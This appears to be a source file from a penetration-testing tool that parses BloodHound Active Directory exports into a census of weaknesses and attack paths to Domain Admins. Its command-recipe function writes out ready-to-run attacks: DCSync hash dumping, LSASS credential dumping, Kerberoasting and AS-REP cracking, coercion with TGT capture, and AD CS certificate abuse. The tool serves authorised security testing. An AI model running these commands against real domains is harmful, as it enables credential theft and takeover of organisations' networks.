/*!
 * obol engine — bloodhound.js
 * BloodHound / SharpHound ingestion — turn a SharpHound/BloodHound-CE export into an
 * engagement-wide domain overlay, entirely client-side. Upload a collection zip (or the
 * loose JSON files), get a census (Domain/Enterprise Admins, Kerberoastable, AS-REP,
 * unconstrained delegation, DCSync principals, broad local-admin, DA sessions, execution
 * reach, foreign principals, ESC1-shape templates), the derived owned→Domain-Admins
 * attack path(s), a PlumHound-style query board, and a self-contained printable report.
 *
 * Faithful JS port of obol-local/obol/bloodhound.py. Deliberately tolerant: BloodHound's
 * JSON schema drifts across versions (legacy SharpHound PascalCase vs BH-CE lower/camel),
 * so every property read is case-insensitive and nesting-tolerant.
 *
 * CONSERVATIVE POSTURE (carried over from the Python): collection is NOT access. Recording
 * `ad.graph.collected` proves the graph was collected and names the domain — it never proves
 * a usable control path. An `ad.attack_paths` fact is a LEAD (the edges exist in the collected
 * data), never a claim the path was walked. A DA/EA census is recon context, not a win.
 *
 * Environment-agnostic module: attaches OBOL.bloodhound to the global. Runs in the window,
 * inside a Web Worker (importScripts), and in Node (require). JSZip (the `JSZip` global,
 * vendored at assets/jszip.min.js) is used to unzip a `.zip` upload in the browser/worker;
 * pre-extracted JSON needs no JSZip, so the Node test path never touches it.
 *
 * CALLER CONTRACT (worker vs main thread): `parse` is async because unzipping is async.
 * The heavy work (parse + census + path derivation) is pure and can run either on the main
 * thread (call OBOL.bloodhound.* directly) or off it via workers/bloodhound-worker.js. When
 * workers are unavailable (e.g. file://), the caller simply runs OBOL.bloodhound on the main
 * thread — same functions, same results.
 */
(function (root) {
  'use strict';
  var OBOL = root.OBOL = root.OBOL || {};

  // ── Universal Windows well-known RIDs / SIDs — Microsoft constants, identical in EVERY
  // Active Directory (not a lab fact). Used only to give a bare SID a readable label; the
  // collection's own name map always wins. ────────────────────────────────────────────────
  var WELL_KNOWN_RID = {
    '500': 'Administrator', '501': 'Guest', '502': 'krbtgt', '512': 'Domain Admins',
    '513': 'Domain Users', '514': 'Domain Guests', '515': 'Domain Computers',
    '516': 'Domain Controllers', '517': 'Cert Publishers', '518': 'Schema Admins',
    '519': 'Enterprise Admins', '520': 'Group Policy Creator Owners', '521': 'Read-only Domain Controllers',
    '526': 'Key Admins', '527': 'Enterprise Key Admins',
  };
  var WELL_KNOWN_SID = {
    'S-1-1-0': 'Everyone', 'S-1-5-7': 'Anonymous', 'S-1-5-9': 'Enterprise Domain Controllers',
    'S-1-5-11': 'Authenticated Users', 'S-1-5-18': 'SYSTEM', 'S-1-5-32-544': 'Administrators',
    'S-1-5-32-545': 'Users', 'S-1-5-32-548': 'Account Operators', 'S-1-5-32-549': 'Server Operators',
    'S-1-5-32-550': 'Print Operators', 'S-1-5-32-551': 'Backup Operators',
    'S-1-5-32-554': 'Pre-Windows 2000 Compatible Access', 'S-1-5-32-555': 'Remote Desktop Users',
  };
  // Broad principals whose control/local-admin over something is a FINDING (a low-privilege
  // population holding privilege). Shape-based: a well-known broad SID, or the domain RID for
  // Domain Users / Domain Computers / Domain Guests.
  var BROAD_PRINCIPAL_SID = { 'S-1-1-0': 1, 'S-1-5-11': 1, 'S-1-5-32-545': 1, 'S-1-5-32-555': 1 };
  var BROAD_PRINCIPAL_RID = { '513': 1, '515': 1, '514': 1 };

  // ACE right-names that are an actionable control edge we can carry out (the cash-in).
  // MemberOf is a traversal edge, not abusable, and is handled separately.
  var ABUSABLE_ACE = {
    GenericAll: 1, GenericWrite: 1, WriteDacl: 1, WriteOwner: 1, Owns: 1, AddMember: 1, AddSelf: 1,
    ForceChangePassword: 1, AllExtendedRights: 1, AddKeyCredentialLink: 1, WriteSPN: 1,
    AddAllowedToAct: 1, SyncLAPSPassword: 1, WriteAccountRestrictions: 1, DCSync: 1, GetChangesAll: 1,
  };
  var MEMBER_ACE = { AddMember: 1, AddSelf: 1 };

  // ACE right-names that ARE (or grant) domain replication — on the domain object = DCSync.
  var DCSYNC_RIGHTS = { GetChangesAll: 1, DCSync: 1 };
  var DCSYNC_OWNING = { GenericAll: 1, WriteDacl: 1, Owns: 1, AllExtendedRights: 1 }; // let you GRANT DCSync

  // ── Tolerant property reads (the SharpHound / BH-CE casing drift) ─────────────────────────
  function isObj(x) { return x && typeof x === 'object' && !Array.isArray(x); }

  // Read a property from a BloodHound object, tolerant of casing/nesting. Looks top-level and
  // in a "Properties"/"properties" sub-object. Case-INSENSITIVE: SharpHound emits PascalCase
  // (ObjectIdentifier, PrincipalSID) while BH-CE/legacy emit lower/camel.
  function prop(entry) {
    if (!isObj(entry)) return null;
    var keys = Array.prototype.slice.call(arguments, 1);
    var deflt = null;
    // (kept API-compatible with the Python `default=` kwarg by treating no default as null)
    var wanted = keys.map(function (k) { return String(k).toLowerCase(); });
    var sub = (isObj(entry.Properties) ? entry.Properties : (isObj(entry.properties) ? entry.properties : {}));
    var sources = [entry, sub];
    for (var si = 0; si < sources.length; si++) {
      var src = sources[si];
      if (!isObj(src)) continue;
      var lowered = {};
      for (var kk in src) { if (Object.prototype.hasOwnProperty.call(src, kk)) lowered[String(kk).toLowerCase()] = src[kk]; }
      for (var wi = 0; wi < wanted.length; wi++) {
        var v = lowered[wanted[wi]];
        if (v !== undefined && v !== null) return v;
      }
    }
    return deflt;
  }

  function sidOf(o) { return String(prop(o, 'objectidentifier', 'objectid', 'sid') || ''); }

  function memberSid(m) {
    if (isObj(m)) return String(m.ObjectIdentifier || m.MemberId || m.objectid || '');
    return String(m == null ? '' : m);
  }

  // A readable label for a SID: the collection's own name first, then a universal well-known
  // RID/SID, else the raw SID (honest — never a guess).
  function resolveSid(sid, names) {
    var s = String(sid == null ? '' : sid).trim();
    if (!s) return '';
    if (names && names[s]) return String(names[s]).split('@')[0];
    if (WELL_KNOWN_SID[s]) return WELL_KNOWN_SID[s];
    if (s.indexOf('S-1-5-21-') === 0) {
      var rid = s.substring(s.lastIndexOf('-') + 1);
      if (WELL_KNOWN_RID[rid]) return WELL_KNOWN_RID[rid];
    }
    return s;
  }

  function isBroadPrincipal(sid) {
    var s = String(sid == null ? '' : sid);
    if (BROAD_PRINCIPAL_SID[s]) return true;
    return s.indexOf('S-1-5-21-') === 0 && !!BROAD_PRINCIPAL_RID[s.substring(s.lastIndexOf('-') + 1)];
  }

  // The domain portion of a machine SID — S-1-5-21-a-b-c for S-1-5-21-a-b-c-<rid>. Empty for a
  // well-known/built-in SID. Used to tell a foreign-domain principal (across a trust) from a local one.
  function domainOfSid(sid) {
    var s = String(sid == null ? '' : sid).trim();
    if (s.indexOf('S-1-5-21-') !== 0) return '';
    var parts = s.split('-');
    return parts.length >= 8 ? parts.slice(0, 7).join('-') : '';
  }

  // ── Graph indexing ───────────────────────────────────────────────────────────────────────
  function newGraph() {
    return {
      names: {}, types: {}, control: [], members: [],
      local_admins: [], sessions: [], rdp: [], psremote: [], dcom: [],
      da_sid: '', ea_sid: '', domain_sid: '',
    };
  }

  // Fold one BloodHound object into the reachability graph: its identity, the ACEs OTHER
  // principals hold over it (control edges), and — for a group — its members (MemberOf edges).
  function indexObject(graph, kind, o) {
    var sid = sidOf(o);
    if (!sid) return;
    var name = String(prop(o, 'name') || sid);
    graph.names[sid] = name;
    graph.types[sid] = kind;
    var aces = o.Aces || o.aces || [];
    if (Array.isArray(aces)) {
      for (var i = 0; i < aces.length; i++) {
        var ace = aces[i];
        if (!isObj(ace)) continue;
        var psid = ace.PrincipalSID || ace.principalSID || ace.principalsid || ace.PrincipalID;
        var right = ace.RightName || ace.rightName || ace.rightname || ace.right;
        if (psid && right) graph.control.push([String(psid), String(right), sid]);
      }
    }
    if (kind === 'groups') {
      var members = o.Members || o.members || [];
      if (Array.isArray(members)) {
        for (var m = 0; m < members.length; m++) {
          var msid = memberSid(members[m]);
          if (msid) graph.members.push([msid, sid]);
        }
      }
      var base = name.split('@')[0].toUpperCase();
      if (base === 'DOMAIN ADMINS') graph.da_sid = sid;
      else if (base === 'ENTERPRISE ADMINS') graph.ea_sid = sid;
    } else if (kind === 'domains') {
      graph.domain_sid = sid;
    }
  }

  // ── kind sniffing + per-file merge ─────────────────────────────────────────────────────────
  function kindOf(name, blob) {
    var meta = blob.meta || blob.Meta || {};
    var t = String((meta && (meta.type || meta.Type)) || '').toLowerCase();
    if (t) return t;
    var low = String(name || '').toLowerCase();
    if (low.indexOf('certtemplate') >= 0 || low.indexOf('certtemplates') >= 0) return 'certtemplates';
    var kinds = ['users', 'computers', 'groups', 'domains', 'gpos', 'ous', 'containers'];
    for (var i = 0; i < kinds.length; i++) if (low.indexOf(kinds[i]) >= 0) return kinds[i];
    return '';
  }

  function mergeJson(summary, name, text) {
    var blob;
    try { blob = JSON.parse(text); } catch (e) { return; }
    if (!isObj(blob)) return;
    var kind = kindOf(name, blob);
    var data = blob.data || blob.Data || [];
    if (!Array.isArray(data)) return;

    var graph = summary._graph;
    var i, o;
    if (graph) {
      for (i = 0; i < data.length; i++) { if (isObj(data[i])) indexObject(graph, kind, data[i]); }
    }

    if (kind === 'domains') {
      for (i = 0; i < data.length; i++) {
        var nm = prop(data[i], 'name', 'domain');
        if (nm) {
          nm = String(nm);
          summary.domain = nm.indexOf('@') >= 0 ? nm.split('@').pop().toUpperCase() : nm;
        }
      }
    } else if (kind === 'users') {
      for (i = 0; i < data.length; i++) {
        var u = data[i];
        var un = String(prop(u, 'name') || '');
        summary.users += 1;
        if (prop(u, 'hasspn', 'hasSPN')) summary.kerberoastable.push(un);
        if (prop(u, 'dontreqpreauth', 'dontReqPreAuth')) summary.asrep_roastable.push(un);
        if (prop(u, 'highvalue', 'highValue', 'system_tags')) summary.high_value.push(un);
        var enabled = prop(u, 'enabled');
        if (enabled !== false) { // a disabled account is not a live weakness
          if (prop(u, 'passwordnotreqd', 'passwordNotReqd')) summary.password_not_required.push(un);
          if (prop(u, 'pwdneverexpires', 'pwdNeverExpires')) summary.pwd_never_expires.push(un);
        }
      }
    } else if (kind === 'computers') {
      for (i = 0; i < data.length; i++) {
        var c = data[i];
        var cn = String(prop(c, 'name') || '');
        summary.computers.push(cn);
        if (prop(c, 'unconstraineddelegation', 'unconstrainedDelegation')) summary.unconstrained_delegation.push(cn);
        var csid = sidOf(c);
        if (graph && csid) {
          // local admins (AdminTo, inverted), sessions (HasSession), and execution-reach local
          // groups (RDP/PSRemote/DCOM). SharpHound wraps each as {Collected, Results:[…]} or a bare list.
          var buckets = [['LocalAdmins', 'local_admins'], ['Sessions', 'sessions'],
                         ['RemoteDesktopUsers', 'rdp'], ['PSRemoteUsers', 'psremote'], ['DcomUsers', 'dcom']];
          for (var b = 0; b < buckets.length; b++) {
            var src = buckets[b][0], bucket = buckets[b][1];
            var raw = c[src] || c[src.toLowerCase()] || [];
            var rows = isObj(raw) ? (raw.Results || []) : (Array.isArray(raw) ? raw : []);
            for (var r = 0; r < (rows || []).length; r++) {
              var mm = rows[r];
              var psid;
              if (src === 'Sessions') {
                psid = isObj(mm) ? (mm.UserSID || mm.MemberId || mm.ObjectIdentifier) : String(mm);
              } else {
                psid = memberSid(mm);
              }
              if (psid) graph[bucket].push([String(psid), csid]);
            }
          }
        }
      }
    } else if (kind === 'groups') {
      for (i = 0; i < data.length; i++) {
        var g = data[i];
        var gn = String(prop(g, 'name') || '');
        var gbase = gn.split('@')[0].toUpperCase();
        var members = g.Members || g.members || [];
        var memberNames = [];
        if (Array.isArray(members)) {
          for (var mi = 0; mi < members.length; mi++) {
            var mem = members[mi];
            var mval = isObj(mem) ? String(mem.ObjectIdentifier || mem.MemberId || '') : String(mem);
            if (mval) memberNames.push(mval);
          }
        }
        if (gbase === 'DOMAIN ADMINS') summary.domain_admins = memberNames.length ? memberNames : summary.domain_admins;
        else if (gbase === 'ENTERPRISE ADMINS') summary.enterprise_admins = memberNames.length ? memberNames : summary.enterprise_admins;
        else if (gbase === 'REMOTE DESKTOP USERS') summary.can_rdp = summary.can_rdp.concat(memberNames);
        else if (gbase === 'REMOTE MANAGEMENT USERS' || gbase === 'WINRMREMOTEWMIUSERS__') summary.can_winrm = summary.can_winrm.concat(memberNames);
      }
    } else if (kind === 'certtemplates') {
      // AD CS ESC1-shape: a client-authentication template that lets the enrollee supply an
      // arbitrary subject (request a cert AS a Domain Admin). Shape-based off SharpHound/Certipy props.
      var ESC_EKU = { '1.3.6.1.5.5.7.3.2': 1, '2.5.29.37.0': 1, '1.3.6.1.5.2.3.4': 1, '1.3.6.1.4.1.311.20.2.2': 1 };
      for (i = 0; i < data.length; i++) {
        var t = data[i];
        var props = (isObj(t.Properties) ? t.Properties : (isObj(t.properties) ? t.properties : {}));
        var tn = String(props.name || props.displayname || prop(t, 'name') || '');
        var supplies = props.enrolleesuppliessubject;
        var clientAuth = props.authenticationenabled;
        var ekus = props.ekus || props.effectiveekus || [];
        var ekuOk = clientAuth === true;
        if (!ekuOk && Array.isArray(ekus)) {
          for (var ei = 0; ei < ekus.length; ei++) { if (ESC_EKU[String(ekus[ei]).trim()]) { ekuOk = true; break; } }
        }
        var tenabled = props.enabled;
        if (tn && supplies === true && ekuOk && tenabled !== false) {
          summary.esc_templates.push(tn + ' (ESC1: enrollee supplies subject + client auth)');
        }
      }
    }
  }

  // ── census derivation (from the transient graph) ─────────────────────────────────────────
  function deriveCensus(summary) {
    var g = summary._graph || {};
    var names = g.names || {};
    var censusKeys = ['domain_admins', 'enterprise_admins', 'high_value', 'can_rdp', 'can_winrm'];
    censusKeys.forEach(function (key) {
      summary[key] = (summary[key] || []).map(function (x) { return resolveSid(x, names); });
    });

    var dom = g.domain_sid || '';
    if (dom) {
      var byPrincipal = {};
      (g.control || []).forEach(function (edge) {
        var psid = edge[0], right = edge[1], tgt = edge[2];
        if (tgt === dom) { (byPrincipal[psid] = byPrincipal[psid] || {})[right] = 1; }
      });
      var dcsync = [];
      Object.keys(byPrincipal).forEach(function (psid) {
        var rights = byPrincipal[psid];
        var hasRepl = rights.GetChanges && (rights.GetChangesAll || rights.DCSync);
        var canGrant = false;
        for (var rr in rights) { if (DCSYNC_OWNING[rr]) { canGrant = true; break; } }
        if (hasRepl || canGrant) dcsync.push(resolveSid(psid, names));
      });
      summary.dcsync_principals = dcsync;
    }

    var adminTo = [];
    (g.local_admins || []).forEach(function (e) {
      if (isBroadPrincipal(e[0])) adminTo.push(resolveSid(e[0], names) + ' → ' + resolveSid(e[1], names));
    });
    summary.admin_to = adminTo;

    var daSid = g.da_sid || '';
    var daMembers = {};
    if (daSid) {
      (g.members || []).forEach(function (e) { if (e[1] === daSid) daMembers[e[0]] = 1; });
      daMembers[daSid] = 1;
    }
    var sessions = [];
    (g.sessions || []).forEach(function (e) {
      if (daMembers[e[0]]) sessions.push(resolveSid(e[0], names) + ' @ ' + resolveSid(e[1], names));
    });
    summary.da_sessions = sessions;

    // execution reach: a broad, low-privilege population that can RDP/PSRemote/DCOM to a host —
    // instant lateral movement with any domain credential. Broad-only (a single user's right is routine).
    [['rdp', 'rdp_reach'], ['psremote', 'psremote_reach'], ['dcom', 'dcom_reach']].forEach(function (pair) {
      var reach = [];
      (g[pair[0]] || []).forEach(function (e) {
        if (isBroadPrincipal(e[0])) reach.push(resolveSid(e[0], names) + ' → ' + resolveSid(e[1], names));
      });
      summary[pair[1]] = reach;
    });

    // foreign principals: a group member whose SID belongs to a DIFFERENT domain than this
    // collection's — a foreign security principal reached over a trust.
    var ourDom = domainOfSid(dom) || domainOfSid(daSid) || domainOfSid(g.ea_sid || '');
    var privGroups = {};
    if (daSid) privGroups[daSid] = 1;
    if (g.ea_sid) privGroups[g.ea_sid] = 1;
    var foreign = [];
    (g.members || []).forEach(function (e) {
      var md = domainOfSid(e[0]);
      if (md && ourDom && md !== ourDom) {
        var tag = privGroups[e[1]] ? ' (privileged)' : '';
        foreign.push(resolveSid(e[0], names) + ' → ' + resolveSid(e[1], names) + tag);
      }
    });
    summary.foreign_principals = foreign;
    return summary;
  }

  // ── bounded owned→DA pathfinder (BloodHound as the pathfinder, not recomputed) ────────────
  function firstAbusable(chain) {
    for (var i = 0; i < chain.length; i++) {
      var h = chain[i];
      if (ABUSABLE_ACE[h.edge]) {
        return { edge: h.edge, target: String(h.to).split('@')[0].trim(),
                 kind: MEMBER_ACE[h.edge] ? 'group' : 'object' };
      }
    }
    return null;
  }

  // Enumerate the paths from a principal we OWN to Domain Admins or the domain object, over
  // BloodHound's own collected edges (group memberships + control ACEs). A bounded query on the
  // data BloodHound gathered. Returns {paths, first}: `paths` is a length-sorted list of hop-chains
  // (each hop {from, edge, to, to_kind}); `first` is the first abusable edge on the SHORTEST path.
  // Because a browser tool has no engagement credential store, the owned principals are passed in
  // explicitly (the user picks/enters them). With none given, returns {paths:[], first:null} —
  // census-only, no path derivation — gracefully.
  function ownedPaths(summary, ownedPrincipals, opts) {
    opts = opts || {};
    var maxPaths = opts.maxPaths || 16;
    var maxDepth = opts.maxDepth || 8;
    var graph = (summary && summary._graph) || {};
    var names = graph.names || {};
    var nameToSid = {};
    Object.keys(names).forEach(function (sid) {
      var key = String(names[sid]).split('@')[0].toLowerCase();
      if (!(key in nameToSid)) nameToSid[key] = sid; // setdefault: first wins
    });
    var owned = [];
    (ownedPrincipals || []).forEach(function (u) {
      var key = String(u == null ? '' : u).split('@')[0].toLowerCase();
      if (key in nameToSid) owned.push(nameToSid[key]);
    });
    var goals = {};
    if (graph.da_sid) goals[graph.da_sid] = 1;
    if (graph.domain_sid) goals[graph.domain_sid] = 1;
    if (!owned.length || !Object.keys(goals).length) return { paths: [], first: null };

    var adj = {};
    (graph.members || []).forEach(function (e) { (adj[e[0]] = adj[e[0]] || []).push(['MemberOf', e[1]]); });
    (graph.control || []).forEach(function (e) { (adj[e[0]] = adj[e[0]] || []).push([e[1], e[2]]); });

    var found = [];
    var types = graph.types || {};

    function dfs(node, path, visited) {
      if (found.length >= maxPaths || path.length >= maxDepth) return;
      var out = adj[node] || [];
      for (var i = 0; i < out.length; i++) {
        var edge = out[i][0], dst = out[i][1];
        if (visited[dst]) continue; // simple paths only (no cycles)
        var hop = { from: names[node] || node, edge: edge, to: names[dst] || dst, to_kind: types[dst] || '' };
        if (goals[dst]) {
          found.push(path.concat([hop]));
          if (found.length >= maxPaths) return;
          continue; // a goal ends the path; don't extend past it
        }
        var nv = Object.assign({}, visited); nv[dst] = 1;
        dfs(dst, path.concat([hop]), nv);
      }
    }

    for (var oi = 0; oi < owned.length; oi++) {
      if (found.length >= maxPaths) break;
      var start = {}; start[owned[oi]] = 1;
      dfs(owned[oi], [], start);
    }
    if (!found.length) return { paths: [], first: null };
    found.sort(function (a, b) { return a.length - b.length; });
    return { paths: found, first: firstAbusable(found[0]) };
  }

  // ── graph projection for the tab / report ────────────────────────────────────────────────
  var NODE_TYPE = {
    users: 'user', user: 'user', groups: 'group', group: 'group',
    computers: 'computer', computer: 'computer', domains: 'domain', domain: 'domain',
    gpos: 'gpo', ous: 'ou', containers: 'container',
  };

  // Merge the owned→DA path chains (each {hops:[…]}) into a node/edge graph the tab renders
  // BloodHound-style: nodes typed and placed by depth, deduplicated control edges between them.
  function pathsToGraph(paths) {
    var nodes = {};
    var edges = [];
    var seen = {};
    (paths || []).forEach(function (p, pi) {
      var hops = p.hops || [];
      if (hops.length) {
        var srcName = hops[0].from;
        if (!nodes[srcName]) nodes[srcName] = { id: srcName, label: srcName, type: 'user', depth: 0, paths: [] };
        nodes[srcName].paths.push(pi);
      }
      hops.forEach(function (h, i) {
        var to = h.to;
        var kind = NODE_TYPE[String(h.to_kind || '').toLowerCase()] || (i === hops.length - 1 ? 'domain' : 'group');
        var n = nodes[to] || (nodes[to] = { id: to, label: to, type: kind, depth: i + 1, paths: [] });
        n.depth = Math.max(n.depth, i + 1);
        if (kind !== 'group' || n.type === 'group') n.type = kind;
        n.paths.push(pi);
        var key = h.from + '\u0000' + to + '\u0000' + h.edge;
        if (!seen[key]) {
          var ed = { from: h.from, to: to, edge: h.edge, path: pi, paths: [pi] };
          seen[key] = ed;
          edges.push(ed);
        } else if (seen[key].paths.indexOf(pi) < 0) {
          seen[key].paths.push(pi);
        }
      });
    });
    var uniqSort = function (arr) { return Object.keys(arr.reduce(function (a, x) { a[x] = 1; return a; }, {})).map(Number).sort(function (a, b) { return a - b; }); };
    Object.keys(nodes).forEach(function (k) { nodes[k].paths = uniqSort(nodes[k].paths); });
    edges.forEach(function (ed) { ed.paths = uniqSort(ed.paths); });
    return { nodes: Object.keys(nodes).map(function (k) { return nodes[k]; }), edges: edges, count: (paths || []).length };
  }

  // ── PlumHound-style domain view (the Domain tab model) ────────────────────────────────────
  function label(x) {
    var s = String(x == null ? '' : x).trim();
    return s.indexOf('@') >= 0 ? s.split('@')[0] : s;
  }

  // Per-query copy-paste command recipes, token-filled from the (optional) owned principal + a
  // best-effort DC/domain. A browser tool has no credential store, so where a secret/host isn't
  // known a placeholder (USER / DC / <HOST> / '') is left for the operator to fill.
  function domainActionCommands(summary, ownedPrincipals, ctx) {
    ctx = ctx || {};
    var u = (ownedPrincipals && ownedPrincipals.length) ? label(ownedPrincipals[0]) : 'USER';
    // Fill from the engagement where we know it: the DC/target host, and the owned account's secret
    // (an NT hash as -H, or a password as -p '…'). Unknown values keep their operator placeholders.
    var dc = ctx.dc || 'DC';
    var domain = summary.domain || 'DOMAIN';
    var sec = ctx.secret || "-p ''";
    var imp = "'" + domain + '/' + u + "'@" + dc;
    var recipes = {
      asrep: ['nxc ldap ' + dc + ' -u ' + u + ' ' + sec + ' --asreproast asrep.hashes',
              'hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt'],
      kerberoast: ['nxc ldap ' + dc + ' -u ' + u + ' ' + sec + ' --kerberoasting kerb.hashes',
                   'hashcat -m 13100 kerb.hashes /usr/share/wordlists/rockyou.txt'],
      dcsync: ['impacket-secretsdump ' + imp + ' -just-dc',
               'impacket-secretsdump ' + imp + ' -just-dc-user administrator'],
      unconstrained: ['python3 printerbug.py ' + domain + '/' + u + ":''@<HOST> <YOUR_IP>",
                      'sudo python3 krbrelayx.py --krbpass -u <HOST>\\$ # capture the coerced DC TGT'],
      adminto: ['nxc smb <HOST> -u ' + u + ' ' + sec + ' --sam --lsa',
                'nxc smb <HOST> -u ' + u + ' ' + sec + ' -M lsassy'],
      sessions: ['nxc smb <HOST> -u ' + u + ' ' + sec + ' -M lsassy   # dump where the DA is logged in'],
      rdp: ['nxc rdp <HOST> -u ' + u + ' ' + sec, 'xfreerdp /u:' + u + " /p:'' /v:<HOST> /cert:ignore"],
      winrm: ['nxc winrm <HOST> -u ' + u + ' ' + sec, 'evil-winrm -i <HOST> -u ' + u + " -p ''"],
      passwordnotreqd: ["nxc smb " + dc + " -u <ACCOUNT> -p ''   # blank-password auth check"],
      rdp_reach: ['nxc rdp <HOST> -u ' + u + ' ' + sec, 'xfreerdp /u:' + u + " /p:'' /v:<HOST> /cert:ignore"],
      psremote_reach: ['nxc winrm <HOST> -u ' + u + ' ' + sec, 'evil-winrm -i <HOST> -u ' + u + " -p ''"],
      dcom_reach: ['impacket-dcomexec ' + imp + ' -object MMC20   # DCOM execution reach',
                   'nxc smb <HOST> -u ' + u + ' ' + sec + ' -x whoami   # confirm the reach'],
      foreign: ['nxc ldap ' + dc + ' -u ' + u + ' ' + sec + ' --query "(objectClass=foreignSecurityPrincipal)" ""'],
      esc: ['certipy find -u ' + u + '@' + domain + ' -dc-ip ' + dc + ' -vulnerable -stdout',
            'certipy req -u ' + u + '@' + domain + ' -dc-ip ' + dc + ' -ca <CA> -template <TEMPLATE> -upn administrator@' + domain],
    };
    // Substitute the remaining host tokens from the engagement when known: <HOST> defaults to the
    // primary target, <YOUR_IP> to the operator's listener IP. Per-node hosts stay adjustable.
    var host = ctx.host, yourip = ctx.lhost;
    if (host || yourip) {
      Object.keys(recipes).forEach(function (key) {
        recipes[key] = recipes[key].map(function (c) {
          var s = c;
          if (host) s = s.split('<HOST>').join(host);
          if (yourip) s = s.split('<YOUR_IP>').join(yourip);
          return s;
        });
      });
    }
    return recipes;
  }

  // The Domain tab's model: a PlumHound-style board of canned high-value queries answered from the
  // summary, plus the derived owned→Domain-Admins path(s). Pure — no network, no writes.
  function domainView(summary, ownedPrincipals, ctx) {
    summary = summary || {};
    var sections = [];
    var cmds = domainActionCommands(summary, ownedPrincipals, ctx);
    function sec(sid, title, hint, items, cash) {
      var rows = (items || []).map(label);
      sections.push({ id: sid, title: title, hint: hint, cash: cash || '',
                      items: rows, count: rows.length, commands: cmds[sid] || [] });
    }

    sec('asrep', 'AS-REP Roastable Users',
        'DONT_REQ_PREAUTH accounts — request the AS-REP and crack it offline, no credential needed.',
        summary.asrep_roastable, 'obol AS-REP roasts + cracks these automatically');
    sec('kerberoast', 'Kerberoastable Users',
        'Accounts with an SPN — request a TGS ticket and crack it offline.',
        summary.kerberoastable, 'obol Kerberoasts these');
    sec('da', 'Domain Admins', 'Full control of the domain — the usual objective.', summary.domain_admins);
    sec('ea', 'Enterprise Admins', 'Forest-wide control (all domains).', summary.enterprise_admins);
    sec('dcsync', 'Can DCSync the Domain', 'Principals holding replication rights (or the ACL to grant '
        + 'them) on the domain object — they can already pull every hash. Where you land, this is the win.',
        summary.dcsync_principals, 'obol secretsdumps once you become one of these');
    sec('unconstrained', 'Unconstrained Delegation', 'Computers that cache any authenticating user’s TGT '
        + '— coerce a DC to authenticate, capture its TGT, and you own the domain.',
        summary.unconstrained_delegation, 'obol coerces + captures the TGT');
    sec('adminto', 'Domain Users → Local Admin', 'Hosts where a broad, low-privilege group is a local '
        + 'administrator — instant lateral movement with any domain account.',
        summary.admin_to, 'log in and dump credentials');
    sec('sessions', 'Where a Domain Admin Is Logged In', 'Live DA sessions — land on this host and steal '
        + 'the token or credentials in memory.', summary.da_sessions, 'token-impersonate or dump LSASS');
    sec('rdp', 'Can RDP', 'Principals who can open an RDP session (Remote Desktop Users) — a way onto '
        + 'a host with a credential you hold.', summary.can_rdp, 'xfreerdp / nxc rdp');
    sec('winrm', 'Can WinRM', 'Principals who can open a WinRM / evil-winrm shell (Remote Management Users).',
        summary.can_winrm, 'evil-winrm / nxc winrm');
    sec('rdp_reach', 'Broad RDP Reach → Host', 'Hosts where a broad, low-privilege group can RDP in — '
        + 'instant lateral movement with any domain credential.', summary.rdp_reach, 'xfreerdp / nxc rdp to that host');
    sec('psremote_reach', 'Broad PSRemote Reach → Host', 'Hosts where a broad group can open a WinRM / '
        + 'PSRemote shell — a shell on that host with any domain credential.', summary.psremote_reach,
        'evil-winrm / nxc winrm to that host');
    sec('dcom_reach', 'Broad DCOM Reach → Host', 'Hosts where a broad group is in Distributed COM Users '
        + '— MMC20/ShellWindows DCOM code execution with any domain credential.', summary.dcom_reach,
        'impacket-dcomexec to that host');
    sec('foreign', 'Foreign Principals (cross-trust)', 'Group members whose SID belongs to another domain '
        + '— a foreign security principal reached over a trust; membership of a privileged group is a '
        + 'cross-domain route to control.', summary.foreign_principals);
    sec('esc', 'Vulnerable Cert Templates (AD CS)', 'ESC1-shape templates: client-auth certificates whose '
        + 'enrollee supplies the subject — request one AS a Domain Admin and authenticate as them.',
        summary.esc_templates, 'certipy req → PKINIT / UnPAC-the-hash');
    sec('passwordnotreqd', 'Password Not Required', 'Accounts flagged PASSWD_NOTREQD — may authenticate '
        + 'with a BLANK password. Try it first, it costs nothing.', summary.password_not_required, "nxc with -p ''");
    sec('pwdneverexpires', 'Password Never Expires', 'Accounts whose password never expires — stale, '
        + 'high-value crack/spray targets.', summary.pwd_never_expires);
    sec('highvalue', 'High-Value Targets', 'Objects BloodHound marks high-value.', summary.high_value);
    sec('computers', 'Computers', 'Domain-joined hosts in the collection.', summary.computers);

    // the headline ANALYSIS — the derived owned→Domain-Admins path(s), as structured hops
    var paths = [];
    var owned = ownedPaths(summary, ownedPrincipals || []);
    (owned.paths || []).forEach(function (chain) {
      var hops = (chain || []).filter(function (h) { return h.from || h.to; }).map(function (h) {
        return { from: label(h.from || ''), edge: String(h.edge || ''), to: label(h.to || ''), to_kind: String(h.to_kind || '') };
      });
      if (hops.length) {
        var dup = paths.some(function (q) { return JSON.stringify(q.hops) === JSON.stringify(hops); });
        if (!dup) paths.push({ hops: hops, length: hops.length });
      }
    });
    paths.sort(function (a, b) { return a.length - b.length; });

    var headline;
    if (paths.length) {
      var goal = paths[0].hops[paths[0].hops.length - 1].to;
      headline = paths.length + ' path(s) from a principal you own to ' + goal + ' — the shortest is '
        + paths[0].length + ' hop(s). obol’s ACL-abuse move walks it automatically.';
    } else if (summary.domain || (summary.files && summary.files.length) || summary.users) {
      headline = 'No owned→Domain-Admins path derived from this collection — start from the high-value '
        + 'queries below (a DCSync principal, an unconstrained-delegation host, or a broad local-admin edge is '
        + 'usually the way in). Enter a principal you own to derive the route.';
    } else {
      headline = '';
    }
    var analysis = { headline: headline, paths: paths, graph: pathsToGraph(paths) };

    var collected = !!(summary.domain || summary.users || (summary.files && summary.files.length)
      || (summary.computers && summary.computers.length));
    return {
      domain: summary.domain || '', collected: collected,
      users: summary.users || 0, ingested_at: summary.ingested_at,
      files: summary.files || [], analysis: analysis, sections: sections,
    };
  }

  // ── self-contained printable report ──────────────────────────────────────────────────────
  var REPORT_CSS = '\n'
    + ':root{--ink:#1a1f2b;--muted:#5b6472;--line:#e3e7ee;--accent:#2f5bea;--goal:#c0392b;--edge:#b7791f;--bg:#f6f8fb}\n'
    + '*{box-sizing:border-box}body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:var(--ink);background:var(--bg);margin:0;padding:0}\n'
    + '.wrap{max-width:900px;margin:0 auto;padding:28px 22px 60px}\n'
    + 'header{background:#12182a;color:#fff;border-radius:12px;padding:20px 24px;margin-bottom:22px}\n'
